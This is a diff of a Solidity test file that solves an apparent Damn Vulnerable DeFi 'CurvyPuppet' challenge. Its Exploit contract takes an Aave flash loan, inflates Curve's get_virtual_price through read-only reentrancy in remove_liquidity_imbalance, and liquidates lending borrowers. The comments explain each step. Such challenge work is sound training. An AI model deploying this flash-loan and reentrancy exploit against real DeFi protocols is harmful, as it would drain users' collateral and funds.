@@ -157,37 +157,30 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        // IStableSwap _curvePool, CurvyPuppetLending _lending, IERC20 _stETH , WETH _weth, address[] memory borrowers
-        // vm.warp(block.timestamp + 2 days);
+
+        // @note The solution to this challenge is pretty straighforward. One needs to manipulate the _getLPTokenPrice to such extent that users collateral becomes at risk. in order for this to happen, curve's get_virtual_price must return a value >= 3,6. 
+        // Now the hard part is the implementation. To be able to influence the rate to such extent we need a huge amount of liquidity, especially in stETH. By Huge I meant > 120_000e18. There are few options here and I believe few solutions can work. The only protocol that offers such high liquidity with very low fees is aave3. This allows us to take a flashLoan and hack the protocol in one shot. While technically you can use many protocols and gets multiple flashloans.
+
+
         address[] memory borrowers = new address[](3);
         borrowers[0] = alice;
         borrowers[1] = bob;
         borrowers[2] = charlie;
+
+        // Recover the player's funds. This will allow us to repay the fees of the flashloan.
+
         weth.transferFrom(treasury, player, TREASURY_WETH_BALANCE);
         weth.withdraw(TREASURY_WETH_BALANCE);
-        curvePool.add_liquidity{value: player.balance}([player.balance, 0], 0);
-        console.log(IERC20(curvePool.lp_token()).balanceOf(player));
 
-
-        deal(player, 300_000e18);
-        Exploit exploit = new Exploit{value: 120_000e18}(curvePool, lending, permit2, dvt, stETH, weth, borrowers);
-        // exploit.flashLoan();
-        IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
-        IERC20(curvePool.lp_token()).transfer(address(exploit), IERC20(curvePool.lp_token()).balanceOf(player));
-        console.log(curvePool.get_virtual_price());
-        address(stETH).call{value: 120_000e18}(abi.encodeWithSignature("submit(address)",address(0)));
-
-        console.log("Player stETH balance: ", stETH.balanceOf(player));
-        // address(exploit).call{value: 40_000e18}("");
-        stETH.transfer(address(exploit), stETH.balanceOf(player) + 1);
-
-        console.log("stETH.balanceOf(player)", stETH.balanceOf(player));
-
-        exploit.remove_Liquidity();
-
-        dvt.transfer(treasury, dvt.balanceOf(player));
-        weth.transfer(treasury, 1 wei);
-        IERC20(curvePool.lp_token()).transfer(treasury, 1 wei);
+        // Create the exploit and execute the logic
+        // //@note 5 steps to this exploit :
+        // 1. Take the flashloan
+        // 2. Manipulate the price in curve
+        // 3. Liquidate the users in CurvyPuppet
+        // 4. Repay the flashloan
+        // 5. Recover the funds to treasury
+        Exploit exploit = new Exploit{value : player.balance}(curvePool, lending, permit2, dvt, stETH, weth, borrowers);
+        exploit.recoverFunds(treasury);
     }
 
     /**
@@ -214,13 +207,6 @@ contract CurvyPuppetChallenge is Test {
     }
 }
 
-import {IBalancerVault} from "./interface.sol";
-
-interface IWSTETH is IERC20 {
-    function wrap(uint256 _stETHAmount) external returns (uint256);
-    function unwrap(uint256 _wstETHAmount) external returns (uint256);
-}
-
 
 contract Exploit {
 
@@ -230,8 +216,9 @@ contract Exploit {
     DamnValuableToken internal immutable dvt;
     IERC20 internal immutable stETH;
     WETH internal immutable weth;
-    IBalancerVault internal constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    // IBalancerVault internal constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IWSTETH internal constant wstETH = IWSTETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
+    IAaveFlashloan aave = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
     address internal immutable player;
     address[] internal to_liquidate;
     uint256 internal nonce;
@@ -247,40 +234,33 @@ contract Exploit {
         player = msg.sender;
     }
 
-    function remove_Liquidity() external {
+    function remove_Liquidity() internal {
         stETH.approve(address(curvePool), type(uint256).max);
-        curvePool.exchange(1, 0, 35_000e18, 0);// 70K
-        curvePool.add_liquidity([uint256(0), 85_000e18], 0);
-        curvePool.add_liquidity{value: 75_000e18}([75_000e18, uint256(0)], 0);// 80k
-        console.log("********************");
-        console.log(IERC20(curvePool.lp_token()).balanceOf(address(this)));
+        uint256 stETHBal = stETH.balanceOf(address(this));
+        // We add massive amount of liquidity
+        curvePool.add_liquidity([uint256(0), stETHBal], 0);
         nonce+=1;
         IERC20(curvePool.lp_token()).approve(address(curvePool), type(uint256).max);
-        curvePool.remove_liquidity_imbalance([uint256(1), 155_000e18], IERC20(curvePool.lp_token()).balanceOf(address(this)));
-        nonce+=1;
-        IERC20(curvePool.lp_token()).transfer(player, 1 wei);
-        curvePool.remove_liquidity(IERC20(curvePool.lp_token()).balanceOf(address(this)), [uint256(0), 0]);
-        console.log(address(this).balance);
-        console.log(IERC20(curvePool.lp_token()).balanceOf(address(this)));
-        curvePool.exchange(1, 0, 70_000e18, 0);
-        console.log("stETH.balanceOf(address(this))", stETH.balanceOf(address(this)));
-        // wstETH.wrap(stETH.balanceOf(address(this)));
-        console.log(address(this).balance);
-        console.log("weth.balanceOf(address(this))", weth.balanceOf(address(this)));
-        weth.deposit{value: 1 wei}();
-        weth.transfer(player, 1 wei);
-        weth.withdraw(weth.balanceOf(address(this)));
+        // @note We then remove all of it at once and specifying 1 wei in eth, this should trigger our receive function and massively increase the virtual rate because :
+        // @note In curve the lp is burned FIRST, then the wei is first sent which triggers the receives and allows us to do a read-only reentrancy of the get_virtual_price
+        // Since it's price hasn't been adjusted yet
+        curvePool.remove_liquidity_imbalance([uint256(1), 161_600e18], IERC20(curvePool.lp_token()).balanceOf(address(this)));
 
-        player.call{value: address(this).balance}("");
-        dvt.transfer(player, dvt.balanceOf(address(this)));
+        // @note Now we burn any remaining LP tokens, because curve will send us ETH native it will execute receive() again. But this time we don't execute any logic
+        nonce+=1;
+        curvePool.remove_liquidity(IERC20(curvePool.lp_token()).balanceOf(address(this)), [uint256(0), 0]);
+
+        assert(IERC20(curvePool.lp_token()).balanceOf(address(this)) == 0);
 
     }
     receive() payable external {
         if(nonce == 1){
-        console.log("Virtual price after manipulation", curvePool.get_virtual_price());
 
-        console.log("LP: ", IERC20(curvePool.lp_token()).balanceOf(address(this)));
+        assert(curvePool.get_virtual_price() > 3.6e18);
 
+        // Use the remaining LP tokens to liquidate the users
+
+        // Need to double approve due to permit2 logic
         IERC20(curvePool.lp_token()).approve(address(permit2), type(uint256).max);
         // Allow lending contract to pull collateral
         permit2.approve({
@@ -290,8 +270,6 @@ contract Exploit {
             expiration: uint48(block.timestamp)
         });
 
-        // console.log("Allowance: ", permit2.allowance(address(this), address(dvt)))
-
         for(uint256 i = 0; i < to_liquidate.length; i++){
         lending.liquidate(to_liquidate[i]);
         }
@@ -299,22 +277,101 @@ contract Exploit {
 
     }
 
-    function flashLoan() external{
-        address[] memory tokens = new address[](1);
-        tokens[0] = address(weth);
-        uint256[] memory amounts = new uint256[](1);
-        amounts[0] = 35_000 ether;
-        bytes memory userData = "";
-        Balancer.flashLoan(address(this), tokens, amounts, userData);
-    }
-
-    function receiveFlashLoan(
-        address[] memory tokens,
-        uint256[] memory amounts,
-        uint256[] memory feeAmounts,
-        bytes memory userData
+    function recoverFunds(
+        address treasury
     ) external {
-        console.log("we here");
-        console.log("weth.balanceOf(player)",weth.balanceOf(address(this)));
+
+        // Execute a flashLoan from aave for 138_000e18 wsteETH
+        address[] memory assets = new address[](1);
+        assets[0] = address(wstETH);
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = 138_000 * 1e18;
+        uint256[] memory interestRateModes = new uint256[](2);
+        interestRateModes[0] = 0;
+        interestRateModes[1] = 0;
+        // This will execute executeOperation
+        aave.flashLoan(address(this), assets, amounts, interestRateModes, address(this), bytes(""), 0);
+
+        // @note Repayement is done. Now any recovered token is sent to treasury to pass the chanllenge
+        weth.deposit{value: address(this).balance}();
+
+        weth.transfer(treasury, weth.balanceOf(address(this)));
+        dvt.transfer(treasury, dvt.balanceOf(address(this)));
+
+
     }
+    function executeOperation(
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata premiums,
+        address initiator,
+        bytes calldata params
+    ) external returns (bool) {
+
+        // Unwrap all wstETH into steth
+        wstETH.unwrap(wstETH.balanceOf(address(this)));
+
+        // Execute the hack logic
+        remove_Liquidity();
+
+        // @note Now time to repay the flashLoan
+
+        uint256 stETHBal = stETH.balanceOf(address(this));
+
+        // We need a bit more wstETH than loaned at first because of fees and slippage during liquidity removal in curve. So we submit eth into steth and wrap it
+        address(stETH).call{value : 95e18}(abi.encodeWithSignature("submit(address)", address(0)));
+        stETH.approve(address(wstETH), stETH.balanceOf(address(this)));
+        wstETH.wrap(stETH.balanceOf(address(this)));
+
+        // Calculate the exact amount that we need to repay and approve aave. transferfrom is executed in aave
+        uint256 wstETHAmountToPay = amounts[0] + (amounts[0] * 5 / 1e4) + 1; 
+        wstETH.approve(address(aave), wstETHAmountToPay);
+
+        return true;
+    }
+}
+
+interface IWSTETH is IERC20 {
+    function wrap(uint256 _stETHAmount) external returns (uint256);
+    function unwrap(uint256 _wstETHAmount) external returns (uint256);
+}
+
+interface IAaveFlashloan {
+    function flashLoan(
+        address receiverAddress,
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata modes,
+        address onBehalfOf,
+        bytes calldata params,
+        uint16 referralCode
+    ) external;
+    function flashLoanSimple(
+        address receiverAddress,
+        address asset,
+        uint256 amount,
+        bytes calldata params,
+        uint16 referralCode
+    ) external;
+
+    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
+
+    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
+
+    function borrow(
+        address asset,
+        uint256 amount,
+        uint256 interestRateMode,
+        uint16 referralCode,
+        address onBehalfOf
+    ) external;
+
+    function repay(
+        address asset,
+        uint256 amount,
+        uint256 interestRateMode,
+        address onBehalfOf
+    ) external returns (uint256);
+
+    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
 }
